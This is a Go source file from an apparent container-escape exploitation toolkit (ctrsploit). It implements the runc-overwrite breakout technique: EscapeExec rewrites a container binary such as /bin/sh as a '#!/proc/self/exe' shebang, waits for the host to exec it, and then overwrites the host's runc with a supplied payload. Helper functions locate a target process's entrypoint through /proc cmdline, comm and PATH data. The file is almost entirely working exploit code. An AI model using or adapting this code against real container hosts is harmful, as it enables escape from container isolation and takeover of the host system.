package pipeprimitive

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/ctrsploit/ctrsploit/internal"
	"github.com/ctrsploit/sploit-spec/pkg/log"
)

const imageEntrypointSelfPayload = "#!/proc/self/exe\n"

func EscapeExec(primitive Primitive, target string, payload []byte, timeout time.Duration) error {
	if target == "" {
		target = "/bin/sh"
	}
	if err := WriteImage(primitive, target, []byte(imageEntrypointSelfPayload)); err != nil {
		return fmt.Errorf("write exec target %q as /proc/self/exe: %w", target, err)
	}
	log.Logger.Infof("Overwritten %s successfully", target)
	log.Logger.Infof("Waiting for the host to exec container target %s ...", target)
	return OverwriteRunc(primitive, payload, timeout)
}

func WriteProcessEntrypointAsSelf(primitive Primitive, pid int) error {
	return WriteProcessEntrypoint(primitive, pid, []byte(imageEntrypointSelfPayload))
}

func WriteProcessEntrypoint(primitive Primitive, pid int, payload []byte) error {
	path, err := processEntrypointPath(pid)
	if err != nil {
		return err
	}

	if err := WriteImage(primitive, path, payload); err != nil {
		return fmt.Errorf("write image entrypoint %q: %w", path, err)
	}
	return nil
}

func processEntrypointPath(pid int) (string, error) {
	shebang, err := internal.IsSheBang(pid)
	if err != nil {
		return "", fmt.Errorf("detect whether /proc/%d uses shebang: %w", pid, err)
	}
	if shebang {
		return processShebangScriptPath(pid)
	}

	if path, err := processArgv0Path(pid); err == nil {
		return path, nil
	}

	return fmt.Sprintf("/proc/%d/exe", pid), nil
}

func processShebangScriptPath(pid int) (string, error) {
	cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return "", fmt.Errorf("read /proc/%d/cmdline: %w", pid, err)
	}
	argv := splitProcessCmdline(cmdline)
	if len(argv) < 2 {
		return "", fmt.Errorf("/proc/%d/cmdline has no shebang script argument", pid)
	}

	comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
	if err != nil {
		return "", fmt.Errorf("read /proc/%d/comm for shebang entrypoint: %w", pid, err)
	}
	processName := strings.TrimSpace(string(comm))
	for _, arg := range argv[1:] {
		path := string(arg)
		if path == "" {
			continue
		}
		if processName != "" && !matchesShebangProcessName(path, processName) {
			continue
		}
		return resolveProcessPathArgument(pid, path)
	}

	return resolveProcessPathArgument(pid, string(argv[1]))
}

func processArgv0Path(pid int) (string, error) {
	cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return "", fmt.Errorf("read /proc/%d/cmdline: %w", pid, err)
	}
	argv := splitProcessCmdline(cmdline)
	if len(argv) == 0 || len(argv[0]) == 0 {
		return "", fmt.Errorf("/proc/%d/cmdline has no argv0", pid)
	}

	return resolveProcessPathArgument(pid, string(argv[0]))
}

func splitProcessCmdline(cmdline []byte) [][]byte {
	return bytes.Split(bytes.TrimRight(cmdline, "\x00"), []byte{0})
}

func matchesShebangProcessName(path, processName string) bool {
	base := filepath.Base(path)
	return base == processName || strings.HasPrefix(base, processName) || strings.Contains(path, processName)
}

func resolveProcessPathArgument(pid int, path string) (string, error) {
	if path == "/proc/self/exe" {
		return fmt.Sprintf("/proc/%d/exe", pid), nil
	}
	if filepath.IsAbs(path) {
		return filepath.EvalSymlinks(path)
	}
	if strings.ContainsRune(path, os.PathSeparator) {
		return filepath.EvalSymlinks(filepath.Join(fmt.Sprintf("/proc/%d/cwd", pid), path))
	}

	if resolved, err := resolveProcessPathExecutable(pid, path); err == nil {
		return resolved, nil
	}
	return "", fmt.Errorf("resolve argv0 %q for pid %d", path, pid)
}

func resolveProcessPathExecutable(pid int, name string) (string, error) {
	for _, dir := range processPathDirs(pid) {
		path := filepath.Join(dir, name)
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		if info.IsDir() || info.Mode()&0o111 == 0 {
			continue
		}
		return filepath.EvalSymlinks(path)
	}
	return "", os.ErrNotExist
}

func processPathDirs(pid int) []string {
	dirs := []string{"/bin", "/usr/bin", "/sbin", "/usr/sbin"}
	environ, err := os.ReadFile(fmt.Sprintf("/proc/%d/environ", pid))
	if err != nil {
		return dirs
	}
	for _, entry := range bytes.Split(environ, []byte{0}) {
		if !bytes.HasPrefix(entry, []byte("PATH=")) {
			continue
		}
		pathValue := strings.TrimPrefix(string(entry), "PATH=")
		if pathValue == "" {
			return dirs
		}
		return append(strings.Split(pathValue, ":"), dirs...)
	}
	return dirs
}
